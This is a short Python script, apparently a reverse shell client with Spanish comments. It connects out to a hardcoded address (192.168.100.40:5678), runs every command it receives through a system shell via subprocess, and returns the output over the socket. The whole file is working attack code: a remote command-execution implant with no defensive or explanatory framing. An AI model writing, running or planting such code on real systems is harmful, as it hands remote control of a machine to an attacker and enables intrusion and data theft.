import socket
import os
import subprocess

def recv_exact(sock: socket.socket, size: int) -> bytes:
    """Recibe exactamente 'size' bytes del socket."""
    data = b''
    while len(data) < size:
        packet = sock.recv(size - len(data))
        if not packet:
            break
        data += packet
    return data

def send_with_header(sock: socket.socket, data):
    """Envía datos con un header de 8 bytes indicando el tamaño del payload."""
    payload = data.encode('utf-8') if isinstance(data, str) else data
    header = len(payload).to_bytes(8, "big")
    sock.sendall(header + payload)

def recv_with_header(sock: socket.socket):
    """Recibe datos con header de tamaño. Retorna None si falla."""
    header = recv_exact(sock, 8)
    if len(header) < 8:
        return None
    size = int.from_bytes(header, "big")
    if size == 0:
        return b''
    return recv_exact(sock, size)

def shell():
    current_dir = os.getcwd()
    send_with_header(client, current_dir)
    
    while True:
        res = recv_with_header(client)
        if not res:
            break
        
        command = res.decode('utf-8', errors='replace')
        
        if command == "exit":
            break
        elif command.startswith("cd") and len(command) > 2:
            try:
                os.chdir(command[3:].strip())
                result = os.getcwd()
                send_with_header(client, result)
                print("res", command)
            except Exception as e:
                send_with_header(client, f"Error: {str(e)}")
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                print("result ", result)
                
                if len(result) == 0:
                    ruta = os.getcwd()
                    send_with_header(client, ruta)
                else:
                    send_with_header(client, result)
            except Exception as e:
                send_with_header(client, f"Error: {str(e)}")


def config():
    global ip
    global port
    global client

    ip = "192.168.100.40"
    port = 5678

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip, port))

config()
shell()
client.close()